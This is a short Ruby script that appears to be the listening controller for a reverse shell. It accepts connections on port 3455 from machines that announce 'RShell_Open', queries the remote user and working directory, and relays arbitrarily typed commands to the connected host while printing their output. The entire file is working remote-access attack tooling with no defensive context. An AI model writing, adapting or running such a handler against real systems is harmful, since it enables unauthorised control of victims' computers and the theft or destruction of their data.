require "socket"

host = "0.0.0.0"
port = 3455

server = TCPServer.new(host, port)
puts "Listening on #{host}:#{port.to_s}"
loop do
	puts "Waiting for connection"
	begin
		client = server.accept
	rescue Interrupt
		client.puts "exit"
		puts "\nExiting..."
		exit
	end
	if client.gets.chomp == "RShell_Open"
		currentDirCommand = client.gets
		sock_domain, remote_port, remote_hostname, remote_ip = client.peeraddr
		puts "Received connection from #{remote_ip}"
		loop do
			client.puts "whoami"
			whoami = client.gets.gsub("\\NEWLINE", "\n").chomp.chomp
			client.puts currentDirCommand
			cd = client.gets.gsub("\\NEWLINE", "\n").chomp.chomp
			print "#{whoami}@#{remote_ip}:#{cd}> "
			cmd = gets.chomp
			client.puts cmd
			if cmd.downcase == "exit"
				puts "Exiting..."
				break
			end
			out = client.gets.chomp.gsub("\\NEWLINE", "\n")
			print out
		end
	else
		client.close
	end
end
